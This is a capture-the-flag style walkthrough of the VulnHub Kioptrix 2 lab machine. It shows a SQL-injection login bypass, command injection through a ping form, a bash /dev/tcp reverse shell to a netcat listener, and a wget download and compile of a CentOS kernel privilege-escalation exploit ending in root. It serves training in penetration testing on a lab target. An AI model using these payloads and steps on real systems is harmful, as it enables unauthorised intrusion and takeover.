# Kioptrix 2
Machine IP: 192.168.50.254\
Our IP: 192.168.50.9
1. First we ```nmap 192.168.50.254```
```
root@kali:~/Desktop/VulnHub/Kioptrix2# nmap 192.168.50.254
Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-09 20:08 EDT
Nmap scan report for 192.168.50.254
Host is up (0.0014s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
3306/tcp open  mysql
MAC Address: 00:0C:29:06:B5:C3 (VMware)
```
2. Check the site since port 80 is open from our nmap. We will see the following page:\
![Screenshot][k2homepage]
	* Let's see if there are any other directories we can look at using ```dirb http://192.168.50.254 -r```
```
---- Scanning URL: http://192.168.50.254/ ----
+ http://192.168.50.254/cgi-bin/ (CODE:403|SIZE:290)                                                                                                                           
+ http://192.168.50.254/index.php (CODE:200|SIZE:667)                                                                                                                          
==> DIRECTORY: http://192.168.50.254/manual/                                                                                                                                   
+ http://192.168.50.254/usage (CODE:403|SIZE:287)     
```
*	* Navigating to any of the 403 pages will give the following page:
![Screenshot][k2errorpage]
	* We now know it is running ```Apache 2.0.52 (CentOS)```\
3. Testing the login fields
 	* The first thing to check is if the login fields are properly sanitized. \
Username input:```user:' or ''='```\
Password input:```password' or ''='```\
This brought me into a harmless looking ping page:
![Screenshot][k2pingpage]
4. Testing the ping page out:
	* Let's run a normal ping and see what happens, like ```8.8.8.8```
![Screenshot][k2pingpage2]
	* Time to find out if it can do anything interesting: ```;echo cheese```
![Screenshot][k2pingpage3]
	* Looks like it executes commands directly onto the system
5. Try to establish a reverse shell:
	* We can try to establish a shell using ncat
	* Run ```nc -nvlp 443``` on attacking machine:
```
root@kali:~/Desktop/VulnHub/Kioptrix2# nc -nvlp 443
listening on [any] 443 ...
```
	* Run ```;bash -i >& /dev/tcp/192.168.50.9/443 0>&1``` in the ping input
	* The following should be displayed in your netcat listener
```
root@kali:~/Desktop/VulnHub/Kioptrix2# nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.50.9] from (UNKNOWN) [192.168.50.254] 32784
bash: no job control in this shell
bash-3.00$ 
```

6. Enumerate to look for privilege escalation:
	* First let's check what permissions we have using: ```id```
```
bash-3.00$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$ 
```
	* Enumerate: ```ls```
```
bash-3.00$ ls
index.php
pingit.php
```
	* Produces nothing useful, move upwards:
```
bash-3.00$ cd ..
bash-3.00$ ls
cgi-bin
error
html
icons
manual
usage
```
	* Looks like nothing useful, continue:
```
bash-3.00$ cd ..
bash-3.00$ ls
account
cache
crash
db
empty
ftp
lib
local
lock
log
mail
nis
opt
preserve
run
spool
tmp
tux
www
yp
``` 
*	* Continue:
```
bash-3.00$ cd ..
bash-3.00$ ls
bin
boot
dev
etc
home
initrd
lib
lost+found
media
misc
mnt
opt
proc
root
sbin
selinux
srv
sys
tmp
usr
var
```
*	* Look in /etc/ for any config files that can tell us more:
	* /etc/ contains many files but we are looking for any installed information we can find:
	* ```redhat-release``` sticks out, lets try to read it
```
bash-3.00$ cat redhat-release
CentOS release 4.5 (Final)
```
7. See if CentOS 4.5 is vulnerable:
```
root@kali:~/Desktop/VulnHub/Kioptrix2# searchsploit centOS
----------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                   |  Path
                                                                 | (/usr/share/exploitdb/)
----------------------------------------------------------------- ----------------------------------------
CentOS Web Panel 0.9.8.12 - 'row_id' / 'domain' SQL Injection    | exploits/php/webapps/43855.txt
CentOS Web Panel 0.9.8.12 - Multiple Vulnerabilities             | exploits/php/webapps/43850.txt
Centos 7.1 / Fedora 22 - abrt Privilege Escalation               | exploits/multiple/local/38835.py
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04  | exploits/linux_x86-64/local/42275.c
Linux Kernel (Debian 7/8/9/10 / Fedora 23/24/25 / CentOS 5.3/5.1 | exploits/linux_x86/local/42274.c
Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 1 | exploits/linux/local/9545.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whit | exploits/linux/local/9479.c
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora | exploits/linux_x86/local/9542.c
Linux Kernel 2.6.32 < 3.x.x (CentOS) - 'PERF_EVENTS' Local Privi | exploits/linux/local/25444.c
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - 'Wacom' Multiple Nullp | exploits/linux/dos/39538.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - 'aiptek' Nullpointer D | exploits/linux/dos/39544.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - 'cdc_acm' Nullpointer  | exploits/linux/dos/39543.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - 'cypress_m8' Nullpoint | exploits/linux/dos/39542.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - 'digi_acceleport' Null | exploits/linux/dos/39537.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - 'mct_u232' Nullpointer | exploits/linux/dos/39541.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - visor 'treo_attach' Nu | exploits/linux/dos/39539.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - visor clie_5_attach Nu | exploits/linux/dos/39540.txt
Linux Kernel 3.10.0 (CentOS7) - Denial of Service                | exploits/linux/dos/41350.c
Linux Kernel 3.10.0-229.x (CentOS / RHEL 7.1) - 'iowarrior' Driv | exploits/linux/dos/39556.txt
Linux Kernel 3.10.0-229.x (CentOS / RHEL 7.1) - 'snd-usb-audio'  | exploits/linux/dos/39555.txt
Linux Kernel 3.10.0-514.21.2.el7.x86_64 / 3.10.0-514.26.1.el7.x8 | exploits/linux/local/42887.c
Linux Kernel 3.14.5 (CentOS 7 / RHEL) - 'libfutex' Local Privile | exploits/linux/local/35370.c
Pure-FTPd 1.0.21 (CentOS 6.2 / Ubuntu 8.04) - Null Pointer Deref | exploits/linux/dos/20479.pl
```
*	* We are really interested in 9542.c
	* ```searchsploit -x 9542.c```
```
:
** --
** bash$ gcc -o 0x82-CVE-2009-2698 0x82-CVE-2009-2698.c && ./0x82-CVE-2009-2698
** sh-3.1# id
** uid=0(root) gid=0(root) groups=500(x82) context=user_u:system_r:unconfined_t
** sh-3.1#
** --
** exploit by <p0c73n1(at)gmail(dot)com>.
**
*/
:
```
*	* The runtime instructions looks to be a privesc
	* Make a copy into your directory
```searchsploit -m 9542.c```
	* Run a http server to deliver the exploit:
```
root@kali:~/Desktop/VulnHub/Kioptrix2# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```
*	* Navigate to the reverse shell and navigate to /tmp/ where you will most likely have permissions to write files:
```
bash-3.00$ wget 192.168.50.9:8000/9542.c
--21:18:23--  http://192.168.50.9:8000/9542.c
           => `9542.c'
Connecting to 192.168.50.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,643 (2.6K) [text/plain]

    0K ..                                                    100%  504.11 MB/s

21:18:23 (504.11 MB/s) - `9542.c' saved [2643/2643]
```
*	* Time to run the exploit:
```
bash-3.00$ gcc -o exploit 9542.c
9542.c:109:28: warning: no newline at end of file
bash-3.00$ ls
9542.c
exploit
bash-3.00$ ./exploit
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00# 
```
ROOTED

[k2homepage]: https://github.com/jawyuhz/Vulnhub_Writeups/blob/master/Screenshots/K2homepage.png
[k2pingpage]: https://github.com/jawyuhz/Vulnhub_Writeups/blob/master/Screenshots/K2pingpage.png
[k2errorpage]: https://github.com/jawyuhz/Vulnhub_Writeups/blob/master/Screenshots/k2errorpage.png
[k2pingpage]: https://github.com/jawyuhz/Vulnhub_Writeups/blob/master/Screenshots/K2pingpage.png
[k2pingpage2]: https://github.com/jawyuhz/Vulnhub_Writeups/blob/master/Screenshots/K2pingpage2.png
[k2pingpage3]: https://github.com/jawyuhz/Vulnhub_Writeups/blob/master/Screenshots/K2pingpage3.png


